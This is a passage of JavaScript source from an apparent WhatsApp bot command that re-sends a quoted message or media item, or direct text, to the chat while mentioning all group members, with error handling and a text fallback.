          text: m.quoted.text || 'No message content found.',
          ...mentionAll
        }, { quoted: mek });
      }

      // Handle media messages
      if (['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage'].includes(type)) {
        try {
          const buffer = await m.quoted.download?.();
          if (!buffer) return reply("❌ Failed to download the quoted media.");

          let content;
          switch (type) {
            case "imageMessage":
              content = { image: buffer, caption: m.quoted.text || "📷 Image", ...mentionAll };
              break;
            case "videoMessage":
              content = { 
                video: buffer, 
                caption: m.quoted.text || "🎥 Video", 
                gifPlayback: m.quoted.message?.videoMessage?.gifPlayback || false, 
                ...mentionAll 
              };
              break;
            case "audioMessage":
              content = { 
                audio: buffer, 
                mimetype: "audio/mp4", 
                ptt: m.quoted.message?.audioMessage?.ptt || false, 
                ...mentionAll 
              };
              break;
            case "stickerMessage":
              content = { sticker: buffer, ...mentionAll };
              break;
            case "documentMessage":
              content = {
                document: buffer,
                mimetype: m.quoted.message?.documentMessage?.mimetype || "application/octet-stream",
                fileName: m.quoted.message?.documentMessage?.fileName || "file",
                caption: m.quoted.text || "",
                ...mentionAll
              };
              break;
          }

          if (content) {
            return await Gifted.sendMessage(from, content, { quoted: mek });
          }
        } catch (e) {
          console.error("Media download/send error:", e);
          return reply("❌ Failed to process the media. Sending as text instead.");
        }
      }

      // Fallback for any other message type
      return await Gifted.sendMessage(from, {
        text: m.quoted.text || "📨 Message",
        ...mentionAll
      }, { quoted: mek });
    }

    // If no quoted message, but a direct message is sent
    if (q) {
      // If the direct message is a URL, send it as a message
      if (isUrl(q)) {
        return await Gifted.sendMessage(from, {
          text: q,
          ...mentionAll
        }, { quoted: mek });
      }

      // Otherwise, just send the text without the command name
      await Gifted.sendMessage(from, {
        text: q, // Sends the message without the command name
        ...mentionAll
      }, { quoted: mek });
    }

  } catch (e) {
    console.error(e);
    reply(`❌ *Error Occurred !!*\n\n${e.message}`);
  }
});
